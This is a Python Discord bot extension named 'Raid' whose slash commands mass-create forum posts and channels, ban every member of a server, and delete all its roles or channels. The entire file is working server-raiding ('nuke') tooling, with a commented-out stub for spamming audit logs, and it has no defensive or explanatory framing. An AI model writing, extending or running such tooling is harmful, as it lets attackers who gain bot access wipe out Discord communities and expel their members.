from typing import Optional, Literal

from discord import app_commands, Interaction, ForumChannel, ChannelType
from discord.ext import commands

from core.utils.cog import Cog

from core.utils.message import Messenger

from random import choice


class Raid(Cog, description='Raiding utilities'):

    @commands.is_owner()
    @app_commands.guild_only()
    @app_commands.command(name='spam-post', description='Spam posts')
    async def spam_post(self, interaction: Interaction, forum: ForumChannel, amount: int, title: Optional[str] = '...', content: Optional[str] = '...') -> None:
    
        await interaction.response.defer()

        for _ in range(amount):
            await forum.create_thread(name=title, content=content)

        await Messenger(interaction).followup_send(f'Spammed total `{amount}` posts on {forum.mention}', ephemeral=True)
    
    # @commands.is_owner()
    # @app_commands.guild_only()
    # @app_commands.command(name='spam-auditlog', description='Spam audit logs')
    # async def spam_auditlog(self, interaction: Interaction, amount: int) -> None:
    #     # 
    #     channels = interaction.guild_id.

    @app_commands.choices(
        channel_type = [
            app_commands.Choice(name=channel_type, value=channel_type)
            for channel_type in ['text', 'voice', 'category', 'random']
        ]
    )
    @commands.is_owner()
    @app_commands.guild_only()
    @app_commands.command(name='spam-channel', description='Spam channels')
    async def spam_channel(self, interaction: Interaction, name: str, amount: int, channel_type: app_commands.Choice[str]) -> None:
        create_method = getattr(interaction.guild, f'create_{channel_type.value}_channel', None)

        await interaction.response.defer()

        for _ in range(amount):

            if channel_type.value == 'random':
                random = choice(['text', 'voice', 'category', 'stage'])
                print(random)
                create_method = getattr(interaction.guild, f'create_{random}_channel')

            await create_method(name)
        
        await Messenger(interaction).followup_send(f'Spammed total `{amount}` {channel_type.value} channels')
    
    @commands.is_owner()
    @app_commands.guild_only()
    @app_commands.command(name='mass-ban', description='Mass ban members')
    async def mass_ban(self, interaction: Interaction) -> None:
        members = interaction.guild.members

        await interaction.response.defer()

        for member in interaction.guild.members:
            await member.ban()

        await Messenger(interaction).followup_send(f'Mass-banned total `{len(members)}` members')

    @commands.is_owner()
    @app_commands.guild_only()
    @app_commands.command(name='mass-delete', description='Mass delete')
    async def mass_delete(self, interaction: Interaction, type: Literal['role', 'channel']) -> None:
        guild = interaction.guild
        to_del = guild.roles if type == 'role' else guild.channels

        await interaction.response.defer()

        for item in to_del: 
            await item.delete()
        
        await Messenger(interaction).followup_send(f'Mass-deleted total {len(to_del)} {f'{type}s'}')